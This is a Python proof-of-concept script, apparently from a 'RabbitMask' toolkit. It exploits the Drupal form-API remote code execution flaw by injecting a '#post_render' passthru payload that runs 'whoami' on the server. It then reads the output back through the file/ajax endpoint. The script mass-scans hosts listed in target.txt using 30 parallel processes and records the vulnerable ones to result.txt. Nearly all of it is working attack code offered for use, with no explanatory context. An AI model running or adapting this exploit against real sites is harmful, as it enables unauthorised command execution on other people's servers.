#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

'''
 ____       _     _     _ _   __  __           _
|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\
'''

import re
import requests
from multiprocessing import Pool, Manager

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",}

def saveinfo(result):
    if result:
        fw=open('result.txt','a')
        fw.write(result+'\n')
        fw.close()

def poc(target,q):
    print('加载目标：'+target)
    requests.packages.urllib3.disable_warnings()
    get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': 'whoami'}
    post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
    try:
        r = requests.post(target, params=get_params, data=post_params, verify=False,allow_redirects=False)
        rule1 = re.compile(r'<input type="hidden" name="form_build_id" value="(.*?)" />')
        form_build_id = rule1.findall(r.text)
        if form_build_id:
            get_params = {'q':'file/ajax/name/#value/' + form_build_id[0]}
            post_params = {'form_build_id':form_build_id[0]}
            r = requests.post(target, params=get_params, data=post_params, verify=False)
            rule2 = re.compile(r'(.*?)\[{"command":"settings","settings":.*?')
            parsed_result=rule2.findall(r.text.replace('\n','').replace(' ','').replace('\r','').replace('\t',''))
            if parsed_result and len(parsed_result[0])>0:
                print(("Found a vulnerable target:"+target+"\tPermissions of the current user is:"+parsed_result[0]))
                return ("Found a vulnerable target:"+target+"\tPermissions of the current user is:"+parsed_result[0])
    except:
        pass
    q.put(target)


def poolmana():
    p = Pool(30)
    q = Manager().Queue()
    fr = open('target.txt', 'r')
    ips=fr.readlines()
    fr.close()
    for i in ips:
        i=i.replace('\n','')
        p.apply_async(poc, args=(i, q,),callback=saveinfo)
    p.close()
    p.join()

def run():
    poolmana()


if __name__ == '__main__':
    run()
